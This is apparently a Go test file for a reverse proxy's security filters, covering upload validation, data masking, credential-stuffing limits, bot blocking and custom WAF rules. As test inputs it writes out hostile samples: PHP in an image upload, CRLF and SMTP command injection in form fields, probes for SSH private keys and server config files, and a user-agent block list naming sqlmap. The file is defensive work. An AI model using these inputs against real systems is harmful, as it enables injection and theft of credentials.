		h.Set("Content-Disposition", `form-data; name="`+field+`"; filename="`+name+`"`)
		h.Set("Content-Type", ctype)
		pw, err := w.CreatePart(h)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = pw.Write(data)
		_ = w.Close()
		r := httptest.NewRequest("POST", "http://app.example.com/api/attachments", bytes.NewReader(buf.Bytes()))
		r.Header.Set("Content-Type", w.FormDataContentType())
		return r
	}
	png := append([]byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a}, make([]byte, 32)...)
	if v := f.Begin(context.Background(), info).Request(upload("file", "photo.png", "image/png", png)); v.Deny {
		t.Fatalf("png denied: %+v", v)
	}
	if v := f.Begin(context.Background(), info).Request(upload("file", "photo.php.png", "image/png", png)); !v.Deny || v.Status != 415 {
		t.Fatalf("double extension accepted: %+v", v)
	}
	if v := f.Begin(context.Background(), info).Request(upload("file", "photo.png", "image/png", []byte("<?php echo 1; ?>"))); !v.Deny || !strings.HasPrefix(v.Detail, "executable") {
		t.Fatalf("php content accepted: %+v", v)
	}
	if v := f.Begin(context.Background(), info).Request(upload("avatar", "photo.png", "image/png", png)); !v.Deny || !strings.HasPrefix(v.Detail, "field") {
		t.Fatalf("unknown field accepted: %+v", v)
	}
	avatars := filterFromExample(t, "filters/uploads.yaml", "avatars")
	raw := httptest.NewRequest("PUT", "http://app.example.com/api/me/avatar", bytes.NewReader([]byte("not an image")))
	raw.Header.Set("Content-Type", "image/png")
	raw.Header.Set("Content-Disposition", `attachment; filename="me.png"`)
	if v := avatars.Begin(context.Background(), info).Request(raw); !v.Deny || !strings.HasPrefix(v.Detail, "type_unknown") {
		t.Fatalf("strict raw upload accepted: %+v", v)
	}
}

// TestSensitiveData runs the example sensitive_data filters against a
// request and responses carrying personal and secret data.
func TestSensitiveData(t *testing.T) {
	info := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9")}
	dlp := filterFromExample(t, "filters/sensitive-data.yaml", "dlp")
	in := dlp.Begin(context.Background(), info)
	req := httptest.NewRequest("POST", "http://api.example.com/v1/orders?token=abc", strings.NewReader(`{"card":"4111 1111 1111 1111","note":"OS-123456789012"}`))
	req.Header.Set("Content-Type", "application/json")
	if v := in.Request(req); v.Deny {
		t.Fatalf("log mode denied: %+v", v)
	}
	body, _ := io.ReadAll(req.Body)
	if !strings.Contains(string(body), "4111 1111 1111 1111") {
		t.Fatalf("log mode changed the body: %s", body)
	}
	resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"application/json"}}, Body: io.NopCloser(strings.NewReader(`{"email":"anna@example.com","pnr":"19811218-9876"}`)), ContentLength: -1}
	if v := in.Response(resp); v.Deny {
		t.Fatalf("mask mode denied: %+v", v)
	}
	body, _ = io.ReadAll(resp.Body)
	if strings.Contains(string(body), "anna@example.com") || strings.Contains(string(body), "19811218") {
		t.Fatalf("response not masked: %s", body)
	}
	attrs := fmt.Sprint(in.End())
	for _, want := range []string{"card", "order_secret", "email", "personnummer", "password_query"} {
		if !strings.Contains(attrs, want) {
			t.Errorf("end attributes lack %s: %s", want, attrs)
		}
	}
	block := filterFromExample(t, "filters/sensitive-data.yaml", "no-cards-out")
	resp = &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"text/csv"}}, Body: io.NopCloser(strings.NewReader("id,card\n1,5555555555554444\n")), ContentLength: -1}
	if v := block.Begin(context.Background(), info).Response(resp); !v.Deny || v.Status != 502 || v.Reason != "sensitive_data" {
		t.Fatalf("card export not blocked: %+v", v)
	}
	resp = &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"text/csv"}}, Body: io.NopCloser(strings.NewReader("id,name\n1,anna\n")), ContentLength: -1}
	if v := block.Begin(context.Background(), info).Response(resp); v.Deny {
		t.Fatalf("clean export blocked: %+v", v)
	}
}

// TestAccountGuard runs the example account filter through a credential
// stuffing run: many accounts from one address on the login endpoint.
func TestAccountGuard(t *testing.T) {
	f := filterFromExample(t, "filters/accounts.yaml", "accounts")
	info := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Path: "/api/login", Method: "POST"}
	attempt := func(user string) filter.Verdict {
		r := httptest.NewRequest("POST", "http://shop.example.com/api/login", strings.NewReader(`{"username":"`+user+`","password":"x"}`))
		r.Header.Set("Content-Type", "application/json")
		in := f.Begin(context.Background(), info)
		v := in.Request(r)
		if !v.Deny {
			in.Response(&http.Response{StatusCode: 401, Header: http.Header{}, Body: io.NopCloser(strings.NewReader(""))})
		}
		return v
	}
	for i := 0; i < 4; i++ {
		if v := attempt(fmt.Sprintf("user%d@example.com", i)); v.Deny {
			t.Fatalf("attempt %d denied: %+v", i, v)
		}
	}
	// Five address failures reach the delay step; ten distinct accounts
	// the challenge step.
	for i := 4; i < 10; i++ {
		if v := attempt(fmt.Sprintf("user%d@example.com", i)); v.Deny {
			t.Fatalf("attempt %d denied: %+v", i, v)
		}
	}
	if v := attempt("user10@example.com"); !v.Deny || !v.Challenge || v.Reason != "account_abuse" || !strings.Contains(v.Detail, "ip_accounts") {
		t.Fatalf("stuffing not challenged: %+v", v)
	}
	// A registration from a disposable domain is challenged too.
	r := httptest.NewRequest("POST", "http://shop.example.com/api/register", strings.NewReader(`{"email":"x@mailinator.com"}`))
	r.Header.Set("Content-Type", "application/json")
	reg := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.10"), Path: "/api/register", Method: "POST"}
	if v := f.Begin(context.Background(), reg).Request(r); !v.Deny || !v.Challenge || !strings.Contains(v.Detail, "disposable_email") {
		t.Fatalf("disposable registration: %+v", v)
	}
}

func TestBadBots(t *testing.T) {
	main := fmt.Sprintf(`
version: 1
includes: [%q]
server:
  listeners: [{name: main, address: "127.0.0.1:0"}]
upstreams:
  - name: web
    endpoints: [{address: "10.0.0.1:8080"}]
routes:
  - {name: default, filters: [bad-bots], upstream: web}
`, filepath.Join(root(t), "blocklists", "bad-bots.yaml"))
	cfg, err := config.ParseWith([]byte(main), false)
	if err != nil {
		t.Fatal(err)
	}
	k, _ := filter.Lookup(cfg.Filters[0].Kind)
	f, err := k.New("bad-bots", filter.Options(cfg.Filters[0].Options), filter.Env{Log: nolog})
	if err != nil {
		t.Fatal(err)
	}
	info := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9")}
	for ua, deny := range map[string]bool{"Mozilla/5.0 (X11; Linux) Firefox/130.0": false, "sqlmap/1.8": true,
		"python-requests/2.32": true, "Mozilla/5.0 (compatible; AhrefsBot/7.0)": true, "": true} {
		r := httptest.NewRequest("GET", "http://www.example.com/", nil)
		if ua != "" {
			r.Header.Set("User-Agent", ua)
		}
		v := f.Begin(context.Background(), info).Request(r)
		if v.Deny != deny {
			t.Errorf("%q: deny=%v", ua, v.Deny)
		}
	}
}

func TestBodyRewrite(t *testing.T) {
	f := filterFromExample(t, "rewrites/body.yaml", "public-links")
	info := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9")}
	in := f.Begin(context.Background(), info)
	r := httptest.NewRequest("GET", "http://www.example.com/", nil)
	in.Request(r)
	body := `<a href="http://intranet.example.internal:8080/x">x</a><script src="/vendor/tracker.js"></script>
{"internalId": "42", "name": "n"}`
	resp := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"text/html"}}, Body: io.NopCloser(strings.NewReader(body)), ContentLength: int64(len(body))}
	if v := in.Response(resp); v.Deny {
		t.Fatalf("response denied: %+v", v)
	}
	out, _ := io.ReadAll(resp.Body)
	got := string(out)
	if strings.Contains(got, "intranet.example.internal") || strings.Contains(got, "tracker.js") || strings.Contains(got, `"42"`) || !strings.Contains(got, "https://www.example.com/x") || !strings.Contains(got, `"redacted"`) {
		t.Fatalf("rewritten body:\n%s", got)
	}
	// Other content types pass untouched.
	in2 := f.Begin(context.Background(), info)
	in2.Request(httptest.NewRequest("GET", "http://www.example.com/i.png", nil))
	png := &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"image/png"}}, Body: io.NopCloser(strings.NewReader("intranet.example.internal")), ContentLength: 25}
	in2.Response(png)
	if b, _ := io.ReadAll(png.Body); string(b) != "intranet.example.internal" {
		t.Fatalf("binary body touched: %q", b)
	}

	req := filterFromExample(t, "rewrites/body.yaml", "legacy-fields")
	in3 := req.Begin(context.Background(), info)
	pr := httptest.NewRequest("POST", "http://api.example.com/orders", strings.NewReader(`{"customer_no": 7}`))
	pr.Header.Set("Content-Type", "application/json")
	if v := in3.Request(pr); v.Deny {
		t.Fatalf("request denied: %+v", v)
	}
	if b, _ := io.ReadAll(pr.Body); string(b) != `{"customerNumber": 7}` {
		t.Fatalf("request body: %s", b)
	}
}

func TestWasmPolicy(t *testing.T) {
	module := filepath.Join(root(t), "filters", "wasm", "policy.wasm")
	data, err := os.ReadFile(filepath.Join(root(t), "filters", "wasm", "wasm.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := config.ParseWith([]byte(strings.ReplaceAll(string(data), "/etc/xproxy/filters/policy.wasm", module)), false)
	if err != nil {
		t.Fatal(err)
	}
	k, _ := filter.Lookup("wasm")
	f, err := k.New("policy", filter.Options(cfg.Filters[0].Options), filter.Env{Log: nolog})
	if err != nil {
		t.Fatal(err)
	}
	info := &filter.Info{RequestID: "r", ClientIP: netip.MustParseAddr("203.0.113.9"), Route: "web"}
	r := httptest.NewRequest("GET", "http://www.example.com/", nil)
	r.Header.Set("X-Debug", "1")
	in := f.Begin(context.Background(), info)
	if v := in.Request(r); !v.Deny || v.Status != 403 || v.Reason != "debug_header" {
		t.Fatalf("debug request: %+v", v)
	}
	in.End()
	in = f.Begin(context.Background(), info)
	r = httptest.NewRequest("GET", "http://www.example.com/", nil)
	if v := in.Request(r); v.Deny {
		t.Fatalf("plain request denied: %+v", v)
	}
	resp := &http.Response{StatusCode: 200, Header: http.Header{}, Body: io.NopCloser(strings.NewReader("ok"))}
	if v := in.Response(resp); v.Deny {
		t.Fatalf("response denied: %+v", v)
	}
	if resp.Header.Get("X-Policy") != "v1" {
		t.Fatalf("response header not set: %v", resp.Header)
	}
	attrs := in.End()
	found := false
	for i := 0; i+1 < len(attrs); i += 2 {
		if attrs[i] == "wasm_policy" && attrs[i+1] == "checked" {
			found = true
		}
	}
	if !found {
		t.Fatalf("log attribute missing: %v", attrs)
	}
}

// attr returns one attribute a filter verdict carries, or nil.
func attr(v filter.Verdict, name string) any {
	for i := 0; i+1 < len(v.Attrs); i += 2 {
		if s, ok := v.Attrs[i].(string); ok && s == name {
			return v.Attrs[i+1]
		}
	}
	return nil
}

// matchedRule reports whether a WAF verdict names this rule id among
// the rules that matched.
func matchedRule(v filter.Verdict, id string) bool {
	return strings.Contains(fmt.Sprint(attr(v, "waf_matched")), id)
}

// TestWAFProtocolSurfaceRules compiles the fourth custom rule file and
// puts one request through every rule in it, then the traffic that must
// still pass. These name the web surfaces that sit beside the non-HTTP
// protocols the proxy speaks, so the false-positive cases are where an
// ordinary application looks like a mail server or a broker.
func TestWAFProtocolSurfaceRules(t *testing.T) {
	e := wafEngine(t, "protocol-surface-rules.conf")
	bare := wafEngineBare(t, "protocol-surface-rules.conf")
	get := func(path string, hdr ...string) *http.Request {
		r := httptest.NewRequest("GET", "http://www.example.com"+path, nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		for i := 0; i+1 < len(hdr); i += 2 {
			r.Header.Set(hdr[i], hdr[i+1])
		}
		return r
	}
	post := func(path, ctype, body string, hdr ...string) *http.Request {
		r := httptest.NewRequest("POST", "http://www.example.com"+path, strings.NewReader(body))
		r.Header.Set("Content-Type", ctype)
		r.Header.Set("Content-Length", fmt.Sprint(len(body)))
		r.Header.Set("User-Agent", "Mozilla/5.0")
		for i := 0; i+1 < len(hdr); i += 2 {
			r.Header.Set(hdr[i], hdr[i+1])
		}
		return r
	}
	form := func(values url.Values, hdr ...string) *http.Request {
		return post("/submit", "application/x-www-form-urlencoded", values.Encode(), hdr...)
	}
	for _, c := range []struct {
		id   string
		name string
		mk   func() *http.Request
	}{
		{"23001", "webmail path", func() *http.Request { return get("/roundcube/") }},
		{"23001", "mail administration path", func() *http.Request { return get("/postfixadmin/login.php") }},
		{"23002", "exchange autodiscover", func() *http.Request { return get("/autodiscover/autodiscover.xml") }},
		{"23002", "zimbra soap", func() *http.Request { return get("/service/soap/AuthRequest") }},
		{"23003", "postfix main.cf", func() *http.Request { return get("/etc/postfix/main.cf") }},
		{"23004", "line break in a mail header field", func() *http.Request {
			return form(url.Values{"subject": {"hello\r\nBcc: victim@example.com"}})
		}},
		{"23005", "smtp command in a parameter", func() *http.Request {
			return form(url.Values{"note": {"x%0d%0aRCPT TO: <victim@example.com>"}})
		}},
		{"23011", "broker client listing", func() *http.Request { return get("/api/v5/clients?page=1") }},
		{"23012", "broker system tree", func() *http.Request { return get("/bridge?topic=%24SYS/broker/clients") }},
		{"23013", "wildcard subscription", func() *http.Request { return get("/bridge?topic=%23") }},
		{"23014", "broker configuration file", func() *http.Request { return get("/config/mosquitto.conf") }},
		{"23021", "private key path", func() *http.Request { return get("/backup/.ssh/id_ed25519") }},
		{"23021", "known hosts", func() *http.Request { return get("/home/deploy/.ssh/known_hosts") }},
		{"23022", "filezilla session file", func() *http.Request { return get("/backup/sitemanager.xml") }},
		{"23023", "remote access console", func() *http.Request { return get("/guacamole/") }},
		{"23024", "private key in a form field", func() *http.Request {
			return form(url.Values{"key": {"-----BEGIN OPENSSH PRIVATE KEY-----\nZGVjb3k=\n-----END OPENSSH PRIVATE KEY-----\n"}})
		}},
		{"23024", "private key in a json body", func() *http.Request {
			return post("/api/keys", "application/json",
				`{"key":"-----BEGIN RSA PRIVATE KEY-----\nZGVjb3k=\n-----END RSA PRIVATE KEY-----"}`)
		}},
		{"23033", "masque target path", func() *http.Request { return get("/.well-known/masque/udp/10.0.0.1/53/") }},
		{"23041", "protocol scanner", func() *http.Request {
			return get("/", "User-Agent", "Mozilla/5.0 zgrab/0.x")
		}},
		{"23042", "host and port in a form", func() *http.Request {
			return form(url.Values{"host": {"10.0.0.5"}, "port": {"1883"}})
		}},
	} {
		v := wafRequest(t, bare, c.mk())
		if !v.Deny {
			t.Errorf("%s (%s): %+v, want a deny", c.name, c.id, v)
			continue
		}
		if !matchedRule(v, c.id) {
			t.Errorf("%s: denied by %v, want rule %s among them", c.name, attr(v, "waf_matched"), c.id)
		}
		if v := wafRequest(t, e, c.mk()); !v.Deny {
			t.Errorf("%s: passed with the CRS loaded: %+v", c.name, v)
		}
	}
	// What an ordinary application sends that is close enough to one of
	// these rules to be worth proving. A blog about mail servers, a
	// form with a subject line, a topic parameter that names one topic.
	for _, c := range []struct {
		name string
		r    *http.Request
	}{
		{"an article about mail", get("/blog/how-we-run-postfix")},
		{"a subject line with no line break", form(url.Values{"subject": {"Order 4821 confirmed"}})},
		{"a named topic", get("/bridge?topic=sensors/17/telemetry")},
		{"a host with no port", form(url.Values{"host": {"cdn.example.com"}})},
		{"a port that is not a service port", form(url.Values{"host": {"10.0.0.5"}, "port": {"8080"}})},
		{"a public key upload", form(url.Values{"key": {"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 deploy@example.com"}})},
		{"a well-known path that is not masque", get("/.well-known/security.txt")},
		{"an ordinary browser", get("/products?page=2")},
	} {
		if v := wafRequest(t, e, c.r); v.Deny {
			t.Errorf("%s was denied: %+v", c.name, v)
		}
	}
}

// checkOneDaemon holds the examples to the shape an operator can
// actually deploy: one file, one daemon. An example whose listeners
// span two of them would be a file nobody can run as written, and the
// daemon column in examples/README.md would be a guess rather than a
// fact.
//
// The one exception is a file with no listeners at all -- a fragment of
// routes, filters or rules -- which belongs to whichever daemon
// includes it.
func checkOneDaemon(t *testing.T, cfg *config.Config) {
	t.Helper()
	owners := map[string][]string{}
	for _, lc := range cfg.Server.Listeners {
		role, ok := listener.RoleOf(lc.Kind)
		if !ok {
			t.Fatalf("listener %q has kind %q, which no daemon serves", lc.Name, lc.Kind)
		}
		owners[role.Daemon()] = append(owners[role.Daemon()], lc.Name)
	}
	if len(owners) > 1 {
		t.Errorf("listeners span %d daemons and cannot be one file: %v", len(owners), owners)
	}
}
